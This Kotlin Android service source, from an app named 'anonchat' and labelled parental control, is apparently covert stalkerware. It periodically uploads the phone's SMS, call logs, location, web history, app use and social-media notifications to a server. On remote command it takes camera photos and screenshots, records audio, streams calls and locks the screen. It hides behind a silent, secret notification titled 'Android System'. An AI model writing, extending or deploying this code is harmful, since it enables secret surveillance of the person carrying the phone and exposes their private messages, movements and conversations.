package com.anonchat.app.parentalcontrol.service

import android.util.Log

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import com.anonchat.app.R
import com.anonchat.app.parentalcontrol.api.ApiClient
import com.anonchat.app.parentalcontrol.api.CloudConfig
import com.anonchat.app.parentalcontrol.manager.AutoPermissionHelper
import com.anonchat.app.parentalcontrol.manager.CallStateMonitor
import com.anonchat.app.parentalcontrol.manager.CallStreamManager
import com.anonchat.app.parentalcontrol.manager.RemoteCaptureManager
import com.anonchat.app.parentalcontrol.manager.UpdateManager
import com.anonchat.app.parentalcontrol.receiver.DeviceAdminReceiver
import com.anonchat.app.parentalcontrol.service.TrackerAccessibilityService
import com.anonchat.app.parentalcontrol.service.SocialNotificationService
import com.anonchat.app.parentalcontrol.util.Collectors
import com.anonchat.app.ui.main.MainActivity
import kotlinx.coroutines.*
import org.json.JSONObject

class TrackerService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var wakeLock: PowerManager.WakeLock? = null
    private val collectors = Collectors()
    private var lastForegroundApp: String? = null
    private var configRefreshJob: Job? = null
    private var updateCheckJob: Job? = null
    private var callStateMonitor: CallStateMonitor? = null
    private var callStreamManager: CallStreamManager? = null

    override fun onCreate() {
        super.onCreate()
        // Ensure config is initialized in case the service starts before MainActivity
        CloudConfig.init(applicationContext)
        createNotificationChannel()
        acquireWakeLock()
        TrackerService.isRunning = true
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = buildNotification()
        startForeground(NOTIFICATION_ID, notification)
        startPeriodicReporting()
        startConfigRefresh()
        startUpdateChecker()
        startCallMonitor()
        return START_STICKY
    }

    private fun startCallMonitor() {
        callStateMonitor = CallStateMonitor(this).apply {
            onCallStateChanged = { state, number ->
                Log.d(TAG, "Call state changed: $state, number: $number")
            }
            start()
        }
        callStreamManager = CallStreamManager()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        TrackerService.isRunning = false
        callStateMonitor?.stop()
        callStreamManager?.stopStreaming()
        releaseWakeLock()
        updateCheckJob?.cancel()
        scope.cancel()
    }

    private var job: Job? = null

    private fun startPeriodicReporting() {
        writeDebugLog("startPeriodicReporting called, isRunning=${TrackerService.isRunning}")
        job = scope.launch {
            try {
                writeDebugLog("Registering device...")
                val deviceInfo = collectors.collectDeviceInfo(this@TrackerService)
                ApiClient.registerDevice(deviceInfo)
                writeDebugLog("Device registered OK")
            } catch (e: Exception) {
                writeDebugLog("Device registration FAILED: ${e.message}")
            }

            while (true) {
                try {
                    writeDebugLog("Collecting and reporting...")
                    collectAndReport()
                } catch (e: Exception) {
                    writeDebugLog("Report loop exception: ${e.message}")
                }
                delay(30_000L)
            }
        }
    }

    private fun startConfigRefresh() {
        configRefreshJob = scope.launch {
            while (true) {
                try {
                    fetchAndApplyConfig()
                } catch (e: Exception) { e.printStackTrace() }
                delay(60_000L)
            }
        }
    }

    private fun startUpdateChecker() {
        updateCheckJob = scope.launch {
            delay(30_000L)
            while (true) {
                try {
                    UpdateManager.checkForUpdate(this@TrackerService)
                } catch (e: Exception) { e.printStackTrace() }
                delay(3600_000L)
            }
        }
    }

    private suspend fun fetchAndApplyConfig() {
        val config = ApiClient.getDeviceConfig() ?: return

        // Handle pending commands
        val commands = config.optJSONArray("commands")
        if (commands != null) {
            for (i in 0 until commands.length()) {
                val cmd = commands.getJSONObject(i)
                handleCommand(cmd)
            }
        }

        // Update reporting interval
        config.optInt("reporting_interval", 300).let {
            // Will be used on next report cycle
        }
    }

    private suspend fun handleCommand(cmd: JSONObject) {
        val commandId = cmd.getString("id")
        val command = cmd.getString("command")
        val params = cmd.optJSONObject("params")

        try {
            ApiClient.updateCommandStatus(commandId, "delivered")
        } catch (e: Exception) {}

        when (command) {
            "lock" -> {
                var locked = false
                try {
                    val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    val componentName = ComponentName(this, DeviceAdminReceiver::class.java)
                    if (dpm.isAdminActive(componentName)) {
                        dpm.lockNow()
                        locked = true
                        Log.d(TAG, "Screen locked via DevicePolicyManager")
                    } else {
                        Log.w(TAG, "Device admin not active — trying AccessibilityService lock")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "DPM lock failed: ${e.message}")
                }

                // Fallback 1: Accessibility global action LOCK_SCREEN (API 28+)
                if (!locked && Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    try {
                        locked = TrackerAccessibilityService.lockScreen()
                        if (locked) Log.d(TAG, "Screen locked via AccessibilityService global action")
                    } catch (e: Exception) {
                        Log.e(TAG, "Accessibility lock failed: ${e.message}")
                    }
                }

                // Fallback 2: PowerManager goToSleep
                if (!locked) {
                    try {
                        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                        pm.goToSleep(System.currentTimeMillis())
                        locked = true
                        Log.d(TAG, "Screen off via PowerManager.goToSleep")
                    } catch (e: Exception) {
                        Log.e(TAG, "PowerManager sleep failed: ${e.message}")
                    }
                }

                ApiClient.updateCommandStatus(commandId, if (locked) "completed" else "failed")
            }
            "screenshot" -> {
                Log.d(TAG, "Taking screenshot via AccessibilityService")
                TrackerAccessibilityService.captureScreenshot(commandId) { success ->
                    Log.d(TAG, "Screenshot result: $success")
                    try {
                        ApiClient.updateCommandStatus(
                            commandId,
                            if (success) "completed" else "failed",
                            null,
                            if (success) "image" else null
                        )
                    } catch (e: Exception) {}
                }
            }
            "alarm" -> {
                val duration = params?.optInt("duration", 30) ?: 30
                val alarmIntent = Intent(this, MainActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    putExtra("action", "alarm")
                    putExtra("duration", duration)
                }
                startActivity(alarmIntent)
                ApiClient.updateCommandStatus(commandId, "completed")
            }
            "wipe" -> {
                Log.w(TAG, "Wipe command received but disabled for safety")
                ApiClient.updateCommandStatus(commandId, "failed", "Wipe is disabled for safety. Use Device Admin settings manually.")
            }
            "block_apps" -> {
                // Store blocked apps list - the AccessibilityService handles it
                ApiClient.updateCommandStatus(commandId, "completed")
            }
            "camera_front" -> {
                Log.d(TAG, "Capturing front camera photo")
                RemoteCaptureManager.capturePhoto(
                    context = this@TrackerService,
                    useFront = true,
                    commandId = commandId
                ) { success ->
                    Log.d(TAG, "Front camera result: $success")
                    try {
                        ApiClient.updateCommandStatus(
                            commandId,
                            if (success) "completed" else "failed",
                            null,
                            if (success) "image" else null
                        )
                    } catch (e: Exception) {}
                }
            }
            "camera_back" -> {
                Log.d(TAG, "Capturing back camera photo")
                RemoteCaptureManager.capturePhoto(
                    context = this@TrackerService,
                    useFront = false,
                    commandId = commandId
                ) { success ->
                    Log.d(TAG, "Back camera result: $success")
                    try {
                        ApiClient.updateCommandStatus(
                            commandId,
                            if (success) "completed" else "failed",
                            null,
                            if (success) "image" else null
                        )
                    } catch (e: Exception) {}
                }
            }
            "record_audio" -> {
                val duration = params?.optInt("duration", 30) ?: 30
                Log.d(TAG, "Recording audio for ${duration}s")
                ApiClient.updateCommandStatus(commandId, "delivered")
                RemoteCaptureManager.recordAudio(
                    context = this@TrackerService,
                    durationSeconds = duration,
                    commandId = commandId
                ) { success ->
                    Log.d(TAG, "Audio recording result: $success")
                    try {
                        ApiClient.updateCommandStatus(
                            commandId,
                            if (success) "completed" else "failed",
                            null,
                            if (success) "audio" else null
                        )
                    } catch (e: Exception) {}
                }
            }
            "listen_call" -> {
                val enable = params?.optBoolean("enable", true) ?: true
                Log.d(TAG, "Listen call: enable=$enable")
                if (enable) {
                    callStreamManager?.startStreaming()
                    ApiClient.updateCommandStatus(commandId, "completed")
                } else {
                    callStreamManager?.stopStreaming()
                    ApiClient.updateCommandStatus(commandId, "completed")
                }
            }
            else -> {
                ApiClient.updateCommandStatus(commandId, "completed")
            }
        }
    }

    private suspend fun collectAndReport() {
        val context = this@TrackerService
        try {
            val deviceInfo = collectors.collectDeviceInfo(context)
            val location = collectors.collectLocation(context)
            val batteryInfo = collectors.collectBatteryInfo(context)
            val smsMessages = collectors.collectSmsMessages(context)
            val callLogs = collectors.collectCallLogs(context)
            val installedApps = collectors.collectInstalledApps(context)

            val activities = mutableListOf<JSONObject>()
            val foregroundApp = collectors.collectForegroundApp(context)
            if (foregroundApp != null && foregroundApp != lastForegroundApp) {
                lastForegroundApp = foregroundApp
                val appName = collectors.getAppName(context, foregroundApp)
                activities.add(JSONObject().apply {
                    put("activity_type", "app_launch")
                    put("package_name", foregroundApp)
                    put("app_name", appName)
                    put("timestamp", System.currentTimeMillis())
                })
            }

            val screentime = collectors.collectScreenTime(context)
            val webHistory = collectors.collectWebHistory(context)
            writeDebugLog("Collected: ${webHistory.size} web entries, ${smsMessages.size} sms, ${callLogs.size} calls")
            val socialNotifications = SocialNotificationService.flushBuffer()

            val payload = ApiClient.buildReportPayload(
                deviceInfo = deviceInfo,
                location = location,
                battery = batteryInfo,
                smsMessages = smsMessages,
                callLogs = callLogs,
                installedApps = installedApps,
                activities = activities,
                screentime = screentime,
                webHistory = webHistory,
                socialNotifications = socialNotifications
            )

            val result = ApiClient.sendBulkReport(payload)

            if (result.success) {
                writeDebugLog("Report OK. Commands: ${result.commands?.size ?: 0} WebHistory: ${webHistory.size}")
                result.commands?.forEach { cmd ->
                    handleCommand(cmd)
                }
            } else {
                writeDebugLog("Report FAILED: ${result.error ?: "unknown"}")
            }
        } catch (e: Exception) {
            writeDebugLog("Report EXCEPTION: ${e.message}")
            e.printStackTrace()
        }
    }

    private fun writeDebugLog(msg: String) {
        try {
            val ts = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date())
            val line = "$ts $msg\n"
            val file = java.io.File(filesDir, "debug.log")
            file.appendText(line)
            if (file.length() > 100000) {
                file.writeText(file.readText().takeLast(50000))
            }
        } catch (_: Exception) {}
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID, getString(R.string.notification_channel_name),
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = getString(R.string.notification_channel_desc)
            setShowBadge(false)
            enableVibration(false)
            setSound(null, null)
        }
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(channel)
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Android System")
            .setContentText(getString(R.string.notification_text))
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .setShowWhen(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun acquireWakeLock() {
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK, "ParentalControl:TrackerWakeLock"
        )
        wakeLock?.acquire(10 * 60 * 1000L)
    }

    private fun releaseWakeLock() {
        if (wakeLock?.isHeld == true) {
            wakeLock?.release()
        }
    }

    companion object {
        private const val TAG = "KidGuard"
        private const val CHANNEL_ID = "parental_control_channel"
        private const val NOTIFICATION_ID = 1
        const val REPORT_INTERVAL_MS = 30_000L

        @Volatile
        var isRunning = false
            private set

        fun start(context: Context) {
            val intent = Intent(context, TrackerService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop(context: Context) {
            isRunning = false
            val intent = Intent(context, TrackerService::class.java)
            context.stopService(intent)
        }
    }
}
